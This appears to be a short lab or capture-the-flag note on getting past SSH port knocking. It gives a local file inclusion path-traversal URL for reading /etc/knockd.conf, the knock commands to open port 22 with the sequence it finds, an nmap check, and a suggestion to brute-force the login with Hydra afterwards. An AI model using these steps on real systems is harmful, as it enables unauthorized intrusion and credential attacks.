If you do a nmap scan, and the results come back with open port 22 but filtered (closed), you will need to do port knocking.

If you managed to gain some access to the server (e.g.: SQL injection with LFI), try checking out the SSH port knocking config:
```
/etc/knockd.conf
```

If using LFI, try:
```
http://10.50.10.140/welcome.php?file=../../../../../../../../../../../../../../etc/knockd.conf
```

Example output:
```
[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn 
```

The core line item here is the sequence:
```
sequence = 7469,8475,9842
```

To open the port, you will need to use the command "knock", if it's not installed, install it:
```
sudo apt install knockd
```

Open the port by knocking on the port with the sequence by running the command:
```
knock -v <targetIP> <sequenceWithOutCommas>
```

e.g.: using the above sequence:
```
knock -v 10.50.10.140 7469 8475 9842
```

If you run nmap scan on port 22, you will see it changed from filtered to open.
```
nmap -sV -p 22 <targetIP>
```

If you have a username and/or password file, you can now try to brute force the box using Hydra
